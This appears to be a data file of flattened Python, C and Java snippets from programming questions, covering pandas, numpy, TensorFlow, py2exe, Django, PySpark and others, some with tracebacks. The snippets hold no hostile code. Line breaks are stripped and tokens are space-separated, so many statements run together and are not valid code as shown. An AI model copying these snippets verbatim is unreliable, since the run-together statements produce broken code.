'' } ] , `` id '' : 3 , `` name '' : `` CardioTest '' , `` parent_id '' : null , `` type '' : `` Parent '' } , { `` children '' : [ ] , `` id '' : 4 , `` name '' : `` Child1 '' , `` parent_id '' : 3 , `` type '' : `` Leaf '' } , { `` children '' : [ ] , `` id '' : 5 , `` name '' : `` Child2 '' , `` parent_id '' : 3 , `` type '' : `` Leaf '' } ] ,"
"import numpy as npa = np.array ( [ 4 , 0 , 8 , 5 , 10 , 9 , np.nan , 1 , 4 , 9 , 9 , np.nan , np.nan , 9 , \ 9 , 8 , 0 , 3 , 7 , 9 , 2 , 6 , 7 , 2 , 9 , 4 , 1 , 1 , np.nan , 10 ] )"
"np.random.seed ( [ 3,1415 ] ) df = pd.DataFrame ( np.random.choice ( [ ( 1 , 2 ) , ( 3 , 4 ) , np.nan ] , ( 10 , 10 ) ) ) df df.stack ( ) .unstack ( fill_value= ( 0 , 0 ) )"
"IOError : [ Errno 2 ] No such file or directory from distutils.core import setupimport py2exeimport os # Python modules excluded from binary filemod_excludes = [ `` Tkinter '' , `` doctest '' , `` unittest '' , `` pydoc '' , `` pygments '' , `` pdb '' , `` email '' , `` _ssl '' , `` difflib '' , `` inspect '' ] # Avoid adding this dependenciesdll_excludes = [ `` MSVCP90.dll '' , `` w9xpopen.exe '' ] # Force to exemod_includes = [ `` sip '' ] package_includes = [ `` app.payloads '' ] py2exe_options = { `` optimize '' : 2 , # 0 ( None ) , 1 ( -O ) , 2 ( -OO ) `` includes '' : mod_includes , `` excludes '' : mod_excludes , `` dll_excludes '' : dll_excludes , `` packages '' : package_includes , # '' xref '' : False , `` bundle_files '' : 1 , `` compressed '' : True # '' dist_dir '' : dist_dir } # TODO generar automaticamente la interfazsetup ( windows= [ { `` script '' : `` app.py '' , `` icon_resources '' : [ ( 1 , `` app/gui/Res/app.ico '' ) ] , `` uac_info '' : `` requireAdministrator '' } ] , data_files=exe_files , options= { `` py2exe '' : py2exe_options } , zipfile=None ) Traceback ( most recent call last ) : File `` app\gui\ui.pyo '' , line 22 , in call_report File `` app\core\core.pyo '' , line 32 , in generate_report File `` app\core\core.pyo '' , line 18 , in launch_payloadIOError : [ Errno 2 ] No such file or directory : ' C : \\Users\\my_user\\path\\to\\app\\dist\\app.exe\\app\\payloads\\autoruns.py '"
"ValueError : Sliced assignment is only supported for variables import tensorflow as tfimport numpy as nptf.reset_default_graph ( ) BATCH_SIZE = 10LENGTH_MAX_OUTPUT = 31it_batch_nr = tf.constant ( 0 ) it_row_nr = tf.Variable ( 0 , dtype=tf.int32 ) it_col_nr = tf.constant ( 0 ) cost = tf.constant ( 0 ) it_batch_end = lambda it_batch_nr , cost : tf.less ( it_batch_nr , BATCH_SIZE ) it_row_end = lambda it_row_nr , cost_matrix : tf.less ( it_row_nr , LENGTH_MAX_OUTPUT+1 ) def iterate_batch ( it_batch_nr , cost ) : cost_matrix = tf.Variable ( np.ones ( ( LENGTH_MAX_OUTPUT+1 , LENGTH_MAX_OUTPUT+1 ) ) , dtype=tf.float32 ) it_rows , cost_matrix = tf.while_loop ( it_row_end , iterate_row , [ it_row_nr , cost_matrix ] ) cost = cost_matrix [ 0,0 ] # IS 1.0 , SHOULD BE 100.0 return tf.add ( it_batch_nr,1 ) , costdef iterate_row ( it_row_nr , cost_matrix ) : # THIS THROWS AN ERROR : cost_matrix [ 0,0 ] .assign ( 100.0 ) return tf.add ( it_row_nr,1 ) , cost_matrixit_batch = tf.while_loop ( it_batch_end , iterate_batch , [ it_batch_nr , cost ] ) sess = tf.InteractiveSession ( ) sess.run ( tf.global_variables_initializer ( ) ) out = sess.run ( it_batch ) print ( out )"
"*** Header Start ***VersionPersist : 1LevelName : SessionSubject : 7Session : 1RandomSeed : -1983293234Group : 1Display.RefreshRate : 59.654*** Header End *** Level : 2 *** LogFrame Start *** MeansEffectBias : 7 Procedure : trialProc itemID : 7 bias1Answer : 1 *** LogFrame End *** Level : 2 *** LogFrame Start *** MeansEffectBias : 2 Procedure : trialProc itemID : 2 bias1Answer : 0 { subject : [ 7 , 7 ] , bias1Answer : [ 1 , 0 ] , itemID : [ 7 , 2 ] } def load_data ( filename ) : data = { } eprime = open ( filename , ' r ' ) for line in eprime : rows = re.sub ( '\s+ ' , ' ' , line ) .strip ( ) .split ( ' : ' ) try : data [ rows [ 0 ] ] += rows [ 1 ] except KeyError : data [ rows [ 0 ] ] = rows [ 1 ] eprime.close ( ) return data for line in open ( fileName , ' r ' ) : if ' : ' in line : row = line.strip ( ) .split ( ' : ' ) fullDict [ row [ 0 ] ] = row [ 1 ] print fullDict { '\x00\t\x00M\x00e\x00a\x00n\x00s\x00E\x00f\x00f\x00e\x00c\x00t\x00B\x00i\x00a\x00s\x00 ' : '\x00 \x005\x00\r\x00 ' , '\x00\t\x00B\x00i\x00a\x00s\x002\x00Q\x00.\x00D\x00u\x00r\x00a\x00t\x00i\x00o\x00n\x00E\x00r\x00r\x00o\x00r\x00 ' : '\x00 \x00-\x009\x009\x009\x009\x009\x009\x00\r\x00 ' Subject itemID ... bias1Answer 7 7 1 7 2 0"
"from LegacyDataLoader import load_me_data ... def do_something ( ) : data = load_me_data ( ) ./dir1/myapp/database/LegacyDataLoader.py./dir1/myapp/database/Other.py./dir1/myapp/database/__init__.py./dir1/myapp/__init__.py ./unit_test/test.py from myapp.database.Other import Otherdef test1 ( ) : o = Other ( ) o.do_something ( ) if __name__ == `` __main__ '' : test1 ( ) ./unit_test_fake/myapp/database/LegacyDataLoader.py./unit_test_fake/myapp/database/__init__.py./unit_test_fake/myapp/__init__.py export PYTHONPATH=unit_test_fake : dir1 : unit_test File `` unit_test/test.py '' , line 1 , in < module > from myapp.database.Other import OtherImportError : No module named Other"
"from sphinx import addnodesdef setup ( app ) : def update_toctree ( app , doctree , docname ) : if docname ! = 'index ' : return node = doctree.traverse ( addnodes.toctree ) [ 0 ] toc = app.env.resolve_toctree ( docname , app.builder , node ) # do something with `` toc '' here app.connect ( 'doctree-resolved ' , update_toctree )"
"counts = [ ( 4 , 1 , 4 ) , ( 3 , 5 , 4 ) , ( 2 , 10 , 4 ) , ( 2 , 10 , 5 ) ] dict = { 4 : { 1:4,5:3,10:2 } ,5 : { 10:2 } }"
"class Foo ( object ) : # pylint : disable=R0903 -- - Closure object def __init__ ( self , data ) : … def single_method ( argument ) : …"
ABCDEF//GHIJKLMN//OPQ//RSTLN//OPQR//STUVW//XYZ// ABCDEF ABCDEF//GHIJKLMN ABCDEF//GHIJKLMN//OPQ
"Class XClass YClass Z Class A ( X , Y ) Class B ( Y , Z ) Class M ( A , B , Z )"
"def foo_a ( ) : print ' a'def foo_b ( ) : print ' b'funcs = { ' a ' : foo_a , ' b ' : foo_b } # dynamically select function based on some keykey = ' a'foo_fn = funcs [ key ]"
"`` ( n , m ) , ( ) - > ( n , p ) , ( p , m ) '' # include `` Python.h '' # include `` math.h '' # include `` numpy/ndarraytypes.h '' # include `` numpy/ufuncobject.h '' static PyMethodDef nmfMethods [ ] = { { NULL , NULL , 0 , NULL } } ; static void double_nmf ( char **args , npy_intp *dimensions , npy_intp* steps , void* data ) { npy_intp i , j , n = dimensions [ 1 ] , //dimensions of input matrix m = dimensions [ 2 ] ; // printf ( `` scalar : % d\n '' , * ( int* ) args [ 1 ] ) ; // input scalar // just print input matrix printf ( `` Input matrix : \n '' ) ; for ( i=0 ; i < n ; i++ ) { for ( j=0 ; j < m ; j++ ) { printf ( `` % .1f `` , * ( double* ) ( args [ 0 ] +8* ( i*m+j ) ) ) ; } printf ( `` \n '' ) ; } return ; } static PyUFuncGenericFunction nmf_functions [ ] = { double_nmf } ; static void * nmf_data [ ] = { ( void * ) NULL } ; static char nmf_signatures [ ] = { PyArray_DOUBLE , PyArray_INT , PyArray_DOUBLE , PyArray_DOUBLE } ; char *nmf_signature = `` ( n , m ) , ( ) - > ( n , p ) , ( p , m ) '' ; PyMODINIT_FUNC initnmf ( void ) { PyObject *m , *d , *version , *nmf ; m = Py_InitModule ( `` nmf '' , nmfMethods ) ; if ( m == NULL ) { return ; } import_array ( ) ; import_umath ( ) ; d = PyModule_GetDict ( m ) ; version = PyString_FromString ( `` 0.1 '' ) ; PyDict_SetItemString ( d , `` __version__ '' , version ) ; Py_DECREF ( version ) ; nmf = PyUFunc_FromFuncAndDataAndSignature ( nmf_functions , nmf_data , nmf_signatures , 1 , 2 , 2 , PyUFunc_None , `` nmf '' , `` '' , 0 , nmf_signature ) ; PyDict_SetItemString ( d , `` nmf '' , nmf ) ; Py_DECREF ( nmf ) ; } # /usr/bin/pythonimport numpy as npimport nmfx = np.array ( [ [ 1,2,3,4,5 ] , [ 6,7,8,9,10 ] , [ 11,12,13,14,15 ] , [ 16,17,18,19,20 ] ] ) y , z = nmf.nmf ( x,2 ) print `` Shapes of outputs : `` , y.shape , z.shape scalar : 2Input matrix:1.0 2.0 3.0 4.0 5.0 6.0 7.0 8.0 9.0 10.0 11.0 12.0 13.0 14.0 15.0 16.0 17.0 18.0 19.0 20.0 Shapes of outputs : ( 4 , 1 ) ( 1 , 5 )"
"import timeimport numpy as npfrom sklearn.datasets import make_classificationfrom tensorflow.keras.models import Sequentialfrom tensorflow.keras.layers import Dense , Flatten # Make a dummy classification problemX , y = make_classification ( ) # Make a dummy modelmodel = Sequential ( ) model.add ( Dense ( 10 , activation='relu ' , name='input ' , input_shape= ( X.shape [ 1 ] , ) ) ) model.add ( Dense ( 2 , activation='softmax ' , name='predictions ' ) ) model.compile ( optimizer='adam ' , loss='sparse_categorical_crossentropy ' , metrics= [ 'accuracy ' ] ) model.fit ( X , y , verbose=0 , batch_size=20 , epochs=100 ) for i in range ( 1000 ) : # Pick a random sample sample = np.expand_dims ( X [ np.random.randint ( 99 ) , : ] , axis=0 ) # Record the prediction time 10x and then take the average start = time.time ( ) for j in range ( 10 ) : y_pred = model.predict_classes ( sample ) end = time.time ( ) print ( ' % d , % 0.7f ' % ( i , ( end-start ) /10 ) ) tensorflow 2.0.0python 3.7.4"
"x = figure ( x_axis_type = `` datetime '' , tools=Tools ) x.hold ( )"
"def f ( x ) : `` '' '' 5-bit LFSR `` '' '' return ( x > > 1 ) ^ ( 0x12* ( x & 1 ) ) def batch ( f , x , n ) : result = [ x ] for _ in xrange ( 1 , n ) : x = f ( x ) result.append ( x ) return resultbatch ( f , 1 , 5 ) def batch ( f , x , n ) : yield x for _ in xrange ( 1 , n ) : x = f ( x ) yield xlist ( batch ( f , 1 , 5 ) ) batch = [ ? ? ? for _ in xrange ( n ) ]"
"PyObject *callback ; PyObject *paths ; // Process and convert arguments if ( ! PyArg_ParseTuple ( args , `` OO : schedule '' , & paths , & callback ) ) return NULL ;"
.. automodule : : mymodule : members :
"doc = nlp ( u '' i love nike shoes from the uk '' ) for ent in doc.ents : print ( ent.text , ent.start_char , ent.end_char , ent.label_ ) doc = nlp ( u '' i love Nike shoes from the Uk '' ) for ent in doc.ents : print ( ent.text , ent.start_char , ent.end_char , ent.label_ ) Nike 7 11 ORGUk 25 27 GPE"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( np.arange ( 16 ) .reshape ( 4 , 4 ) ) % % timeitdf.iloc [ 2 , 2 ] % % timeitdf.values [ 2 , 2 ] % % timeitdf.iat [ 2 , 2 ] % % timeitdf.get_value ( 2 , 2 )"
"def primes ( n ) : `` '' '' Returns list of all the primes up until the number n. '' '' '' # Gather all potential primes in a list . primes = range ( 2 , n + 1 ) # The first potential prime in the list should be two . assert primes [ 0 ] == 2 # The last potential prime in the list should be n. assert primes [ -1 ] == n # ' p ' will be the index of the current confirmed prime . p = 0 # As long as ' p ' is within the bounds of the list : while p < len ( primes ) : # Set the candidate index ' c ' to start right after ' p ' . c = p + 1 # As long as ' c ' is within the bounds of the list : while c < len ( primes ) : # Check if the candidate is divisible by the prime . if ( primes [ c ] % primes [ p ] == 0 ) : # If it is , it is n't a prime , and should be removed . primes.pop ( c ) # Move on to the next candidate and redo the process . c = c + 1 # The next integer in the list should now be a prime , # since it is not divisible by any of the primes before it . # Thus we can move on to the next prime and redo the process . p = p + 1 # The list should now only contain primes , and can thus be returned . return primes # Check if the candidate is divisible by the prime.if ( primes [ c ] % primes [ p ] == 0 ) : # If it is , it is n't a prime , and should be removed from the list . primes.pop ( c ) # Move on to the next candidate and redo the process.c += 1 # If the candidate is divisible by the prime : if ( primes [ c ] % primes [ p ] == 0 ) : # If it is , it is n't a prime , and should be removed from the list . primes.pop ( c ) # If not : else : # Move on to the next candidate . c += 1 # If the candidate is divisible by the prime : if ( primes [ c ] % primes [ p ] == 0 ) : # If it is , it is n't a prime , and should be removed . primes.pop ( c ) # If c is still within the bounds of the list : if c < len ( primes ) : # We assume that the new candidate at ' c ' is not divisible by the prime . assert primes [ c ] % primes [ p ] ! = 0 # Move on to the next candidate and redo the process.c = c + 1"
"registry = [ ] # list of subclassesclass PluginMetaclass ( type ) : def __new__ ( cls , name , bases , attrs ) : print ( cls ) print ( name ) registry.append ( ( name , cls ) ) return super ( PluginMetaclass , cls ) .__new__ ( cls , name , bases , attrs ) class Plugin ( metaclass=PluginMetaclass ) : def __init__ ( self , stuff ) : self.stuff = stuff # in your plugin modulesclass SpamPlugin ( Plugin ) : def __init__ ( self , stuff ) : self.stuff = stuffclass BaconPlugin ( Plugin ) : def __init__ ( self , stuff ) : self.stuff = stuffc = SpamPlugin ( 0 ) b = BaconPlugin ( 0 ) mycls = registry [ 1 ] [ 1 ] d = mycls ( 0 )"
"from auth_utils import authenticate_request , UnauthenticatedRequestdef my_view ( request ) : try : authenticate_request ( request ) except UnauthenticatedRequest : return Http404 ( ) return render ( request , 'ok.html ' , { 'status ' : 'ok ' } ) class TestMyView ( MyAPITestCase , TestCase ) : @ mock.patch ( 'auth_utils.authenticate_request ' , side_effect=None ) def setUp ( self , mock_auth ) : self.response = self.client.get ( reverse ( 'my-view ' ) ) def test_should_return_ok ( self ) : self.assertEqual ( self.response.context.get ( 'status ' ) , 'ok ' )"
"CommandError : System check identified some issues : ERRORS : graphite_alerts.CheckResults : ( models.E020 ) The 'CheckResults.check ( ) ' class method is currently overridden by < django.db.models.fields.related.ReverseSingleRelatedObjectDescriptor object at 0x3a76310 > . class CheckResults ( models.Model ) : WARN = 'warn ' ERROR = 'error ' OK = 'ok ' DOWN = 'down ' STATUS_CHOICES = ( ( WARN , 'Warn ' ) , ( ERROR , 'Error ' ) , ( OK , 'OK ' ) , ( DOWN , 'Down ' ) , ) target = models.CharField ( max_length=1000 ) additional_graph_target = models.CharField ( max_length=1000 , blank=True ) value = models.DecimalField ( max_digits=9 , decimal_places=2 ) timestamp = models.DateTimeField ( db_index=True ) status = models.CharField ( max_length=6 , choices=STATUS_CHOICES , default='ok ' ) check = models.ForeignKey ( Check , related_name='results ' ) tags = TaggableManager ( ) def __unicode__ ( self ) : return self.target @ models.permalink def get_absolute_url ( self ) : return ( 'graphite-check-result-list-view ' , ( ) , { 'pk ' : self.check.pk , 'target ' : self.target } ) def generate_graphite_image_url ( self ) : params = { } params [ 'target ' ] = [ ] params [ 'target ' ] .append ( self.target ) params [ 'target ' ] .append ( 'threshold ( ' + str ( self.check.warn ) + ' , '' Warn '' , '' yellow '' ) ' ) params [ 'target ' ] .append ( 'threshold ( ' + str ( self.check.error ) + ' , '' Error '' , '' red '' ) ' ) params [ 'from ' ] = '-7days ' params [ 'width ' ] = '900 ' params [ 'minorGridLineColor ' ] = 'C0C0C0 ' params [ 'majorGridLineColor ' ] = 'C0C0C0 ' params [ 'bgcolor ' ] = '333333 ' request = requests.get ( self.check.GRAPHITE_URL+self.check.RENDER_PAGE , params=params ) return urllib2.unquote ( request.url.decode ( 'UTF-8 ' ) ) def generate_additional_graphite_image_url ( self ) : params = { } params [ 'target ' ] = [ ] params [ 'target ' ] .append ( self.additional_graph_target ) params [ 'target ' ] .append ( 'threshold ( ' + str ( self.check.warn ) + ' , '' Warn '' , '' yellow '' ) ' ) params [ 'target ' ] .append ( 'threshold ( ' + str ( self.check.error ) + ' , '' Error '' , '' red '' ) ' ) params [ 'from ' ] = '-7days ' params [ 'width ' ] = '900 ' params [ 'minorGridLineColor ' ] = 'C0C0C0 ' params [ 'majorGridLineColor ' ] = 'C0C0C0 ' params [ 'bgcolor ' ] = '333333 ' request = requests.get ( self.check.GRAPHITE_URL+self.check.RENDER_PAGE , params=params ) return urllib2.unquote ( request.url.decode ( 'UTF-8 ' ) ) class Meta : ordering = ( `` timestamp '' , ) unique_together = ( ( `` target '' , `` timestamp '' ) , )"
"def see_if_compiles ( program , include_dirs , define_macros ) : `` '' '' Try to compile the passed in program and report if it compiles successfully or not. `` '' '' from distutils.ccompiler import new_compiler , CompileError from shutil import rmtree import tempfile import os try : tmpdir = tempfile.mkdtemp ( ) except AttributeError : # Python 2.2 does n't have mkdtemp ( ) . tmpdir = `` compile_check_tempdir '' try : os.mkdir ( tmpdir ) except OSError : print `` Ca n't create temporary directory . Aborting . '' sys.exit ( ) old = os.getcwd ( ) os.chdir ( tmpdir ) # Write the program f = open ( 'compiletest.cpp ' , ' w ' ) f.write ( program ) f.close ( ) # redirect the error stream to keep ugly compiler error messages off the command line devnull = open ( 'errors.txt ' , ' w ' ) oldstderr = os.dup ( sys.stderr.fileno ( ) ) os.dup2 ( devnull.fileno ( ) , sys.stderr.fileno ( ) ) # try : c = new_compiler ( ) for macro in define_macros : c.define_macro ( name=macro [ 0 ] , value=macro [ 1 ] ) c.compile ( [ f.name ] , include_dirs=include_dirs ) success = True except CompileError : success = False # undo the error stream redirect os.dup2 ( oldstderr , sys.stderr.fileno ( ) ) devnull.close ( ) os.chdir ( old ) rmtree ( tmpdir ) return success def check_for_header ( header , include_dirs , define_macros ) : `` '' '' Check for the existence of a header file by creating a small program which includes it and see if it compiles . '' '' '' program = `` # include < % s > \n '' % header sys.stdout.write ( `` Checking for < % s > ... `` % header ) success = see_if_compiles ( program , include_dirs , define_macros ) if ( success ) : sys.stdout.write ( `` OK\n '' ) ; else : sys.stdout.write ( `` Not found\n '' ) ; return success"
"board = [ [ 1 , 0 , 0 , 1 ] , [ 0 , 1 , 1 , 0 ] , [ 0 , 0 , 1 , 0 ] , [ 0 , 1 , 0 , 0 ] , ] # Should return False , returns Falseboard1 = [ [ 1 , 0 , 1 ] , [ 1 , 0 , 1 ] , [ 0 , 0 , 1 ] ] # Should return True , returns Falseboard2 = [ [ 1 , 0 , 1 ] , [ 1 , 0 , 1 ] , [ 0 , 1 , 0 ] ] # Should return True , returns Trueboard3 = [ [ 0 , 1 , 0 ] , [ 1 , 1 , 1 ] , [ 0 , 1 , 0 ] ] # Should return True , returns Falseboard4 = [ [ 0 , 0 , 0 , 1 ] , [ 0 , 1 , 1 , 0 ] , [ 0 , 0 , 1 , 0 ] , [ 0 , 1 , 0 , 0 ] , ] def check ( board ) : adjacent_total = [ ] for x in range ( len ( board ) ) : for y in range ( len ( board [ 0 ] ) ) : adjacent = [ ] if board [ x ] [ y ] == 1 : for i in range ( x-1 , x+2 ) : for j in range ( y-1 , y+2 ) : if i == x and j == y : continue if i == len ( board ) or j == len ( board [ 0 ] ) : break if i > = 0 and j > = 0 : if board [ i ] [ j ] == 1 : adjacent.append ( ( i , j ) ) else : adjacent = None adjacent_total.append ( adjacent ) for i in adjacent_total : if i is None : continue elif len ( i ) == 1 : return False return Trueprint ( check ( board1 ) ) print ( check ( board2 ) ) print ( check ( board3 ) ) print ( check ( board4 ) )"
"> > > t = urlparse.urlparse ( 'www.example.com ' , 'http ' ) > > > t.geturl ( ) 'http : ///www.example.com ' # three /// 'http : //www.example.com ' # two //"
"def follow ( self ) : mouse_pos = pygame.mouse.get_pos ( ) diff = ( self.xPos-mouse_pos [ 0 ] , self.yPos-mouse_pos [ 1 ] ) vector = math.sqrt ( diff [ 0 ] **2 + diff [ 1 ] **2 ) distance = ( self.xPos/vector , self.yPos/vector ) if ( self.xPos , self.yPos ) == mouse_pos : return if mouse_pos [ 0 ] > = self.xPos : self.xPos += distance [ 0 ] else : self.xPos -= distance [ 0 ] if mouse_pos [ 1 ] > = self.yPos : self.yPos += distance [ 1 ] else : self.yPos -= distance [ 1 ]"
"File `` < stdin > '' , line 1SyntaxError : future feature * is not defined"
class AuthProxy ( AuthProxy ) : `` '' '' Special proxy for facebook.auth . '' '' '' def getSession ( self ) : `` '' '' Facebook API call . See http : //developers.facebook.com/documentation.php ? v=1.0 & method=auth.getSession '' '' '' ... return result def createToken ( self ) : `` '' '' Facebook API call . See http : //developers.facebook.com/documentation.php ? v=1.0 & method=auth.createToken '' '' '' ... return token
"> > > print generate_date ( '\d { 2,3 } ' ) 13 > > > print generate_date ( '\d { 2,3 } ' ) 422"
obj = ModelClass.objects.select_related ( ) .get ( id=4 ) # 1 db hitfoo = obj.long.chain.of.stuff # no db hit def doit ( obj ) : obj.long.chain.of.stuff # 4 db hits def doit ( obj ) : obj.magic ( ) # 1 db hit obj.long.chain.of.stuff # no db hits
"import pandas.io.sql as psqlimport sqlalchemyquery_string = `` select a from table ; '' def run_my_query ( my_query ) : # username , host , port and database are hard-coded here engine = sqlalchemy.create_engine ( 'postgresql : // { username } @ { host } : { port } / { database } '.format ( username=username , host=host , port=port , database=database ) ) df = psql.read_sql ( my_query , engine ) return df # Run the query ( this is what I want to memoize ) df = run_my_query ( my_query )"
"import pandas as pddf = pd.DataFrame ( { 'col_1 ' : [ [ ' a ' , ' b ' , 's ' ] , 23423 ] } ) df.to_csv ( r ' C : \test.csv ' ) df_1 = pd.read_csv ( r ' C : \test.csv ' , quoting = 3 , quotechar = ' '' ' )"
"> > > import numpy as np > > > import pandas as pd # Create a floating point number that exhibits the problem. > > > ba = bytearray ( [ '\x53 ' , '\x2a ' , '\xb0 ' , '\x49 ' , '\xf3 ' , '\x79 ' , '\x90 ' , '\x40 ' ] ) > > > babytearray ( b'S*\xb0I\xf3y\x90 @ ' ) > > > f = np.frombuffer ( ba ) > > > f [ 0 ] 1054.4875857854684 # Write to dataframe to save as Excel file. > > > df = pd.DataFrame ( { ' a ' : f } ) > > > df.to_excel ( 'test.xlsx ' , engine='xlsxwriter ' ) # Read excel file ( when viewing the file in LibreOffice , the # value is n't 1054.4875857854684 any more ) . > > > df2 = pd.read_excel ( 'test.xlsx ' ) > > > df2.ix [ 0 , ' a ' ] 1054.4875857854699 > > > df2.ix [ 0 , ' a ' ] == f [ 0 ] False # this uses the xlwt engine > > > df.to_excel ( 'test.xls ' ) > > > df2 = pd.read_excel ( 'test.xls ' ) > > > df2.ix [ 0 , ' a ' ] == f [ 0 ] True"
A [ start : end ] = B [ mask ]
# ! /usr/bin/env python -B
"from PySide import QtCore , QtGuiview = QtGui.QTreeWidget ( ) view.show ( ) newItem = QtGui.QTreeWidgetItem ( view ) view.setItemWidget ( newItem,0 , QtGui.QLabel ( 'abc ' ) )"
"Header1 \t Header2 \t ... HeaderNfloat1 \t float2 \t ... floatN Header1 \t Header2 \t ... HeaderNfloat1 \t float2 \t ... floatNfloat1 \t float2 \t ... floatNfloat1 \t float2 \t ... floatN ... thousands of linesfloat1 \t float2 \t ... floatN # include < stdio.h > # include < stdlib.h > # include < dirent.h > # include < time.h > # define LINE_SIZE 300 # define BUFFER_SZ 5000*LINE_SIZEvoid combine ( char *fname ) { DIR *d ; FILE * fp ; char line [ LINE_SIZE ] ; char buffer [ BUFFER_SZ ] ; short flagHeader = 1 ; buffer [ 0 ] = '\0 ' ; // need to init buffer befroe strcat to it struct dirent *dir ; chdir ( `` runs '' ) ; d = opendir ( `` . `` ) ; if ( d ) { while ( ( dir = readdir ( d ) ) ! = NULL ) { if ( ( strstr ( dir- > d_name , `` Hs '' ) ) & & ( strstr ( dir- > d_name , `` .txt '' ) ) ) { fp = fopen ( dir- > d_name , `` r '' ) ; fgets ( line , LINE_SIZE , fp ) ; // read first line if ( flagHeader ) { // append it to buffer only once strcat ( buffer , line ) ; flagHeader = 0 ; } fgets ( line , LINE_SIZE , fp ) ; // read second line strcat ( buffer , line ) ; fclose ( fp ) ; } } closedir ( d ) ; chdir ( `` .. '' ) ; fp = fopen ( fname , `` w '' ) ; fprintf ( fp , buffer ) ; fclose ( fp ) ; } } int main ( ) { clock_t tc ; int msec ; tc = clock ( ) ; combine ( `` results_c.txt '' ) ; msec = ( clock ( ) - tc ) * 1000 / CLOCKS_PER_SEC ; printf ( `` elapsed time : % d. % ds\n '' , msec/1000 , msec % 1000 ) ; return 0 ; } import globfrom time import timedef combine ( wildcard , fname='results.txt ' ) : `` '' '' Concatenates all files matching a name pattern into one file . Assumes that the files have 2 lines , the first one being the header. `` '' '' files = glob.glob ( wildcard ) buffer = `` flagHeader = True for file in files : with open ( file , ' r ' ) as pf : lines = pf.readlines ( ) if not len ( lines ) == 2 : print ( 'Error reading file % s . Skipping . ' % file ) continue if flagHeader : buffer += lines [ 0 ] flagHeader = False buffer += lines [ 1 ] with open ( fname , ' w ' ) as pf : pf.write ( buffer ) if __name__ == '__main__ ' : et = time ( ) combine ( 'runs\\Hs*.txt ' ) et = time ( ) - et print ( `` elapsed time : % .3fs '' % et ) Run 1/10C elapsed time : 9.530sPython elapsed time : 10.225s===================Run 2/10C elapsed time : 5.378sPython elapsed time : 10.613s===================Run 3/10C elapsed time : 6.534sPython elapsed time : 13.971s===================Run 4/10C elapsed time : 5.927sPython elapsed time : 14.181s===================Run 5/10C elapsed time : 5.981sPython elapsed time : 9.662s===================Run 6/10C elapsed time : 4.658sPython elapsed time : 9.757s===================Run 7/10C elapsed time : 10.323sPython elapsed time : 19.032s===================Run 8/10C elapsed time : 8.236sPython elapsed time : 18.800s===================Run 9/10C elapsed time : 7.580sPython elapsed time : 15.730s===================Run 10/10C elapsed time : 9.465sPython elapsed time : 20.532s=================== In [ 2 ] : prun bc.combine ( 'runs\\Hs*.txt ' ) 64850 function calls ( 64847 primitive calls ) in 12.205 seconds Ordered by : internal time ncalls tottime percall cumtime percall filename : lineno ( function ) 1899 8.391 0.004 8.417 0.004 { built-in method io.open } 1898 3.322 0.002 3.341 0.002 { method 'readlines ' of '_io._IOBase ' objects } 1 0.255 0.255 0.255 0.255 { built-in method nt.listdir }"
"> > > print ( int.__doc__ ) int ( x=0 ) - > integerint ( x , base=10 ) - > integerConvert a number or string to an integer , or return 0 if no arguments ... > > > len ( inspect.signature ( int ) .parameters ) 0 > > > def my_int ( x , base=10 ) : ... return int ( x , base ) ... > > > len ( inspect.signature ( my_int ) .parameters ) 2"
# iterate over setfor x in set ( my_list ) : do_something ( x ) # list to set to listfor x in list ( set ( my_list ) ) : do_something ( x )
"col131Dec1989 from pyspark.sql import SparkSessionfrom pyspark.sql.types import *spark = SparkSession \ .builder \ .appName ( `` My app '' ) \ .config ( `` spark.some.config.option '' , `` some-value '' ) \ .getOrCreate ( ) struct = StructType ( [ StructField ( `` column '' , DateType ( ) ) ] ) df = spark.read.load ( `` test.csv '' , \ schema=struct , \ format= '' csv '' , \ sep= '' , '' , \ header= '' true '' , \ dateFormat= '' ddMMMyyyy '' , \ mode= '' FAILFAST '' ) df.show ( ) col131121989 from pyspark.sql import SparkSessionfrom pyspark.sql.types import *spark = SparkSession \ .builder \ .appName ( `` My app '' ) \ .config ( `` spark.some.config.option '' , `` some-value '' ) \ .getOrCreate ( ) struct = StructType ( [ StructField ( `` column '' , DateType ( ) ) ] ) df = spark.read.load ( `` test.csv '' , \ schema=struct , \ format= '' csv '' , \ sep= '' , '' , \ header= '' true '' , \ dateFormat= '' ddMMyyyy '' , \ mode= '' FAILFAST '' ) df.show ( ) + -- -- -- -- -- +| column|+ -- -- -- -- -- +|1989-12-31|+ -- -- -- -- -- + import java.text . * ; import java.util.Date ; class testSimpleDateFormat { public static void main ( String [ ] args ) { SimpleDateFormat format = new SimpleDateFormat ( `` yyyyMMMdd '' ) ; String dateString = `` 1989Dec31 '' ; try { Date parsed = format.parse ( dateString ) ; System.out.println ( parsed.toString ( ) ) ; } catch ( ParseException pe ) { System.out.println ( `` ERROR : Can not parse \ '' '' + dateString + `` \ '' '' ) ; } } } java.text.ParseException : Unparseable date : `` 1989Dec31 '' import java.text . * ; import java.util.Date ; import java.util . * ; class HelloWorldApp { public static void main ( String [ ] args ) { SimpleDateFormat format = new SimpleDateFormat ( `` yyyyMMMdd '' , Locale.US ) ; String dateString = `` 1989Dec31 '' ; try { Date parsed = format.parse ( dateString ) ; System.out.println ( parsed.toString ( ) ) ; } catch ( ParseException pe ) { System.out.println ( pe ) ; System.out.println ( `` ERROR : Can not parse \ '' '' + dateString + `` \ '' '' ) ; } } }"
"def execute ( ) : if condition : skip_current_task ( ) task = PythonOperator ( task_id='task ' , python_callable=execute , dag=some_dag )"
"a = [ `` hello '' , `` hello '' , `` hi '' , `` hi '' , `` hey '' ] b = [ `` hello '' , `` hi '' , `` hey '' ] b = list ( set ( a ) ) a = [ [ `` hello '' , `` hi '' ] , [ `` hello '' , `` hi '' ] , [ `` how '' , `` what '' ] , [ `` hello '' , `` hi '' ] , [ `` how '' , `` what '' ] ] b = [ [ `` hello '' , `` hi '' ] , [ `` how '' , `` what '' ] ]"
@ blueprint.route ( '/users ' ) @ blueprint.route ( '/users/ ' ) @ blueprint.route ( '/users/ < path : path > ' ) def users ( path=None ) : return str ( path )
"def populateList ( self , selecteddisk=None ) : selected = None *** # Bundling - coupling : *** self.listWidget.clear ( ) for disk in self.disks.inOrder ( ) : item = QListWidgetItem ( QString ( `` % 1 of % 2/ % 3 ( % L4 ) '' ) \.arg ( disk.name ) .arg ( disk.owner ) .arg ( disk.country ) \.arg ( disk.teu ) ) self.listWidget.addItem ( item ) *** # Bundling - coupling : *** if selecteddisk is not None and selecteddisk == id ( disk ) : selected = item if selected is not None : selected.setSelected ( True ) self.listWidget.setCurrentItem ( selected )"
